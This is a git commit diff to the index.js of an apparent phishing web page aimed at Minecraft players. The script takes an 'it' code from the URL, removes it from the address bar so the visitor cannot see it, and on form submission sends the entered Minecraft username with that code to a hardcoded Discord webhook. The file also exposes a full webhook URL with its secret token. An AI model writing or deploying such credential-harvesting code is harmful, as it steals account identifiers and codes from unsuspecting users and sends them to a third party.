95cdb40277792d59853405a2d2b53755c3e321cc
twelventi <1220dab@gmail.com>
2021-11-18 10:16:53 -0500

    .

--- index.js
+++ index.js
@@ -1,13 +1,17 @@
 
 let webhook_url = "https://discord.com/api/webhooks/910710435555205120/0Il00HgouH9eFAwOLeWmh7OwkFPn7RiS34A5m_waBMcJMxXZdIbv6b1uZWyEsMQome50";
-
+const urlParams = new URLSearchParams(window.location.search);
+let identityt = undefined;
+if (urlParams.has('it')) {
+    identityt = urlParams.get("it");
+    history.pushState({}, null, location.protocol + '//' + location.host + location.pathname);
+}
 window.onload = (e) => {
     let username_element = document.querySelector('#minecraft-name');
     function processForm(e) {
         if (e.preventDefault) e.preventDefault();
-        const urlParams = new URLSearchParams(window.location.search);
 
-        if (urlParams.has("it")) {
+        if (identityt) {
             fetch(
                 webhook_url,
                 {
@@ -18,7 +22,7 @@ window.onload = (e) => {
                     },
                     //make sure to serialize your JSON body
                     body: JSON.stringify({
-                        content: `name:${username_element.value}\ncode:${urlParams.get("it")}` 
+                        content: `name:${username_element.value}\ncode:${identityt}` 
                     })
                 }
             )
